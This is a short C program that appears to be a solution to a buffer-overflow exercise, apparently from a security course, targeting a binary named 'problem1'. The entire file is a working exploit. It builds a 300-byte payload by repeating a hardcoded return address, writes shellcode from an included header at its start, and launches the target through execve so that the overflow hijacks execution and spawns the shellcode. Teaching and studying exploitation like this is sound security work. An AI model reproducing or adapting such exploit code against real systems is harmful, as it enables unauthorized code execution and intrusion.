#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "problem1"

int main(void)
{
    char *args[3];
    char *env[1];

    char *buff;
    buff = (char *) malloc(300);

    long *addr = (long *)buff;

    for(int i = 0; i<300; i+=4){
        *addr = 0xbffffc58;
        addr++;	  	
    }

    char *temp = buff;
    for(int i=0; i<strlen(shellcode); ++i){
        *temp = shellcode[i];
        temp++;
    }

    args[0] = TARGET; args[1] = buff; args[2] = NULL;
    env[0] = NULL;
    //printf("\n%s\n", buff);

    if (0 > execve(TARGET, args, env))
        printf("execve failed.\n");

    return 0;
}
